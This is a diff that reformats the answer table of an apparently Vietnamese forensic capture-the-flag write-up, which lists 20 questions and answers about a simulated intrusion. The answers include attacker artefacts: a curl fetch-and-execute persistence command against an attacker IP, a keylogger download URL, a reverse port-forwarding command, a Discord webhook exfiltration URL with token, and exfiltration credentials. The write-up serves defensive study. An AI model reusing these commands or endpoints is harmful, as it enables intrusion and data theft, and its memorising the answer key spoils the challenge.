@@ -683,121 +683,196 @@ Ta có thể tìm công cụ có sẵn là [winscppasswd](https://github.com/ano
 
 Vậy đáp án cho câu hỏi là: `s1rx:S1rx_vzNDP79yv`
 
-### 3. Câu hỏi và đáp án ###
+### 3. Câu hỏi và đáp án
 
-<table style="width:100%; table-layout:fixed; border-collapse:collapse;">
-  <colgroup>
-    <col style="width:5%;">
-    <col style="width:63%;">
-    <col style="width:32%;">
-  </colgroup>
+<table>
   <thead>
     <tr>
-      <th style="text-align:center;">STT</th>
-      <th style="width:63%; text-align:center;">Câu hỏi</th>
-      <th style="width:32%; text-align:center;">Đáp án</th>
+      <th width="5%" align="center">STT</th>
+      <th width="60%" align="center">Câu hỏi</th>
+      <th width="35%" align="center">Đáp án</th>
     </tr>
   </thead>
   <tbody>
     <tr>
-      <td style="text-align:center;">1</td>
-      <td>The threat actor abused an internal communication service between employees and shared a malicious file to facilitate lateral movement within the network. This activity is believed to have originated from TriDsk-WKS02 which was recently compromised. Provide the full path of the file that was downloaded.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">C:\Users\Martha\Downloads\TriDsk-OCT-2025_ReleaseNotes_v1.pdf.lnk</code></td>
+      <td align="center" valign="top">1</td>
+      <td valign="top">
+        The threat actor abused an internal communication service between employees and shared a malicious file to facilitate lateral movement within the network. This activity is believed to have originated from TriDsk-WKS02 which was recently compromised. Provide the full path of the file that was downloaded.
+      </td>
+      <td valign="top">
+        <code>C:\Users\<wbr>Martha\<wbr>Downloads\<wbr>TriDsk-OCT-2025_<wbr>ReleaseNotes_<wbr>v1.pdf.lnk</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">2</td>
-      <td>The threat actor downloaded a keylogger to the endpoint to capture user keystrokes. Provide the exact URL used to download the keylogger.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">http://93.121.68.219:8908/645.exe</code></td>
+      <td align="center" valign="top">2</td>
+      <td valign="top">
+        The threat actor downloaded a keylogger to the endpoint to capture user keystrokes. Provide the exact URL used to download the keylogger.
+      </td>
+      <td valign="top">
+        <code>http://<wbr>93.121.68.219:8908/<wbr>645.exe</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">3</td>
-      <td>The threat actor identified and abused a protocol that enabled pivoting to other endpoint within the environment. They used a tool to facilitate further lateral movement abusing this protocol. Find the full command line used to move laterally using port forwarding.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">powershell -Command C:\Users\martha\AppData\Local\Temp\svchosts.exe client --fingerprint YyOMHvo9v7CraOiZmWDmEuRvP6fiIsIeroYRZUqq7f0= 93.121.68.219:8080 R:8000:10.101.1.12:22</code></td>
+      <td align="center" valign="top">3</td>
+      <td valign="top">
+        The threat actor identified and abused a protocol that enabled pivoting to other endpoint within the environment. They used a tool to facilitate further lateral movement abusing this protocol. Find the full command line used to move laterally using port forwarding.
+      </td>
+      <td valign="top">
+        <code>powershell -Command C:\Users\<wbr>martha\<wbr>AppData\<wbr>Local\<wbr>Temp\<wbr>svchosts.exe client --fingerprint YyOMHvo9v7CraOiZmWDmEuRvP6fiIsIeroYRZUqq7f0= 93.121.68.219:8080 R:8000:10.101.1.12:22</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">4</td>
-      <td>To force the user to re-enter their credentials for credential harvesting, the threat actor deployed a script that continuously monitors for the execution of the process related to the protocol being abused and immediately terminates it. Provide the process termination time.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">2025-12-26 00:52:51</code></td>
+      <td align="center" valign="top">4</td>
+      <td valign="top">
+        To force the user to re-enter their credentials for credential harvesting, the threat actor deployed a script that continuously monitors for the execution of the process related to the protocol being abused and immediately terminates it. Provide the process termination time.
+      </td>
+      <td valign="top">
+        <code>2025-12-26 00:52:51</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">5</td>
-      <td>Identify the time interval (in milliseconds) that the keylogger waits before sending captured data to the server.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">1200000</code></td>
+      <td align="center" valign="top">5</td>
+      <td valign="top">
+        Identify the time interval (in milliseconds) that the keylogger waits before sending captured data to the server.
+      </td>
+      <td valign="top">
+        <code>1200000</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">6</td>
-      <td>The keylogger exfiltrated captured data to a remote server. Provide the full destination URL.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">https://discord.com/api/webhooks/1452445434894221455/pKIO5TZGrGL7KaWLb_H03S61nI9OcRe_UKvEHhOBgG507IyprUxzYzBSOyTj46c2AVCY</code></td>
+      <td align="center" valign="top">6</td>
+      <td valign="top">
+        The keylogger exfiltrated captured data to a remote server. Provide the full destination URL.
+      </td>
+      <td valign="top">
+        <code>https://<wbr>discord.com/<wbr>api/<wbr>webhooks/<wbr>1452445434894221455/<wbr>pKIO5TZGrGL7KaWLb_<wbr>H03S61nI9OcRe_<wbr>UKvEHhOBgG507IyprUxzYzBSOyTj46c2AVCY</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">7</td>
-      <td>After harvesting credentials, the threat actor moved laterally to another endpoint. When did they successfully authenticate to the new endpoint?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">2025-12-26 01:33:03</code></td>
+      <td align="center" valign="top">7</td>
+      <td valign="top">
+        After harvesting credentials, the threat actor moved laterally to another endpoint. When did they successfully authenticate to the new endpoint?
+      </td>
+      <td valign="top">
+        <code>2025-12-26 01:33:03</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">8</td>
-      <td>After moving laterally to the second system, the threat actor downloaded two malicious executables. When was the second executable file downloaded?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">2025-12-26 01:50:20</code></td>
+      <td align="center" valign="top">8</td>
+      <td valign="top">
+        After moving laterally to the second system, the threat actor downloaded two malicious executables. When was the second executable file downloaded?
+      </td>
+      <td valign="top">
+        <code>2025-12-26 01:50:20</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">9</td>
-      <td>The threat actor established persistence on this newly compromised endpoint after successfully escalating privileges. What is the full command that is executed as part of the persistence mechanism?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">curl -fsSL http://93.121.68.219:8908/updat3 -o /dev/shm/.upd&amp;&amp; chmod +x /dev/shm/.upd&amp;&amp; /dev/shm/.upd</code></td>
+      <td align="center" valign="top">9</td>
+      <td valign="top">
+        The threat actor established persistence on this newly compromised endpoint after successfully escalating privileges. What is the full command that is executed as part of the persistence mechanism?
+      </td>
+      <td valign="top">
+        <code>curl -fsSL http://<wbr>93.121.68.219:8908/<wbr>updat3 -o /dev/<wbr>shm/<wbr>.upd &amp;&amp; chmod +x /dev/<wbr>shm/<wbr>.upd &amp;&amp; /dev/<wbr>shm/<wbr>.upd</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">10</td>
-      <td>Determine the total dwell time, in minutes, that the threat actor spent on the second endpoint.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">230.42</code></td>
+      <td align="center" valign="top">10</td>
+      <td valign="top">
+        Determine the total dwell time, in minutes, that the threat actor spent on the second endpoint.
+      </td>
+      <td valign="top">
+        <code>230.42</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">11</td>
-      <td>The threat actor performed lateral movement from Second Compromised Endpoint to another endpoint. Which alternative user account was used to access the target endpoint?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">FileSrv_Admin</code></td>
+      <td align="center" valign="top">11</td>
+      <td valign="top">
+        The threat actor performed lateral movement from Second Compromised Endpoint to another endpoint. Which alternative user account was used to access the target endpoint?
+      </td>
+      <td valign="top">
+        <code>FileSrv_Admin</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">12</td>
-      <td>The threat actor obtained initial access on third machine by downloading and executing a malicious executable. Provide the full command used to execute the malicious file.</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">powershell -c Start-Process C:\Users\Administrator\Music\update.exe</code></td>
+      <td align="center" valign="top">12</td>
+      <td valign="top">
+        The threat actor obtained initial access on third machine by downloading and executing a malicious executable. Provide the full command used to execute the malicious file.
+      </td>
+      <td valign="top">
+        <code>powershell -c Start-Process C:\Users\<wbr>Administrator\<wbr>Music\<wbr>update.exe</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">13</td>
-      <td>What is the full file path associated with the malicious service created on the third compromised endpoint?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">\\127.0.0.1\ADMIN$\f94c290.exe</code></td>
+      <td align="center" valign="top">13</td>
+      <td valign="top">
+        What is the full file path associated with the malicious service created on the third compromised endpoint?
+      </td>
+      <td valign="top">
+        <code>\\<wbr>127.0.0.1\<wbr>ADMIN$\<wbr>f94c290.exe</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">14</td>
-      <td>When was Windows Defender real-time protection disabled on the endpoint?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">2025-12-26 02:48:44</code></td>
+      <td align="center" valign="top">14</td>
+      <td valign="top">
+        When was Windows Defender real-time protection disabled on the endpoint?
+      </td>
+      <td valign="top">
+        <code>2025-12-26 02:48:44</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">15</td>
-      <td>The threat actor created a new user account and added it to the 'Domain Admins' group. What is the name of the user account?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">s1rx</code></td>
+      <td align="center" valign="top">15</td>
+      <td valign="top">
+        The threat actor created a new user account and added it to the 'Domain Admins' group. What is the name of the user account?
+      </td>
+      <td valign="top">
+        <code>s1rx</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">16</td>
-      <td>The threat actor attempted to enable the RDP protocol on the endpoint but failed in doing so. They then moved laterally to another endpoint and successfully enabled RDP for remote access. When was RDP enabled?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">2025-12-26 04:14:10</code></td>
+      <td align="center" valign="top">16</td>
+      <td valign="top">
+        The threat actor attempted to enable the RDP protocol on the endpoint but failed in doing so. They then moved laterally to another endpoint and successfully enabled RDP for remote access. When was RDP enabled?
+      </td>
+      <td valign="top">
+        <code>2025-12-26 04:14:10</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">17</td>
-      <td>After Enabling RDP on the fourth endpoint, when did the attacker successfully log in via RDP using the backdoor account?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">2025-12-26 04:23:02</code></td>
+      <td align="center" valign="top">17</td>
+      <td valign="top">
+        After enabling RDP on the fourth endpoint, when did the attacker successfully log in via RDP using the backdoor account?
+      </td>
+      <td valign="top">
+        <code>2025-12-26 04:23:02</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">18</td>
-      <td>The threat actor identified an application used by the IT team, installed it using the installer file already on the system and abused it for data exfiltration. What is the application name and version?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">WinSCP 6.5.3</code></td>
+      <td align="center" valign="top">18</td>
+      <td valign="top">
+        The threat actor identified an application used by the IT team, installed it using the installer file already on the system and abused it for data exfiltration. What is the application name and version?
+      </td>
+      <td valign="top">
+        <code>WinSCP 6.5.3</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">19</td>
-      <td>What was the full file path of the staged data that the threat actor later exfiltrated?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">C:\Users\Public\Downloads\Backup.7z</code></td>
+      <td align="center" valign="top">19</td>
+      <td valign="top">
+        What was the full file path of the staged data that the threat actor later exfiltrated?
+      </td>
+      <td valign="top">
+        <code>C:\Users\<wbr>Public\<wbr>Downloads\<wbr>Backup.7z</code>
+      </td>
     </tr>
     <tr>
-      <td style="text-align:center;">20</td>
-      <td>What username and password did the threat actor use to authenticate to the external exfiltration server?</td>
-      <td style="overflow-wrap:anywhere; word-break:break-word;"><code style="white-space:normal; overflow-wrap:anywhere; word-break:break-word;">s1rx:S1rx_vzNDP79yv</code></td>
+      <td align="center" valign="top">20</td>
+      <td valign="top">
+        What username and password did the threat actor use to authenticate to the external exfiltration server?
+      </td>
+      <td valign="top">
+        <code>s1rx:S1rx_vzNDP79yv</code>
+      </td>
     </tr>
   </tbody>
 </table>
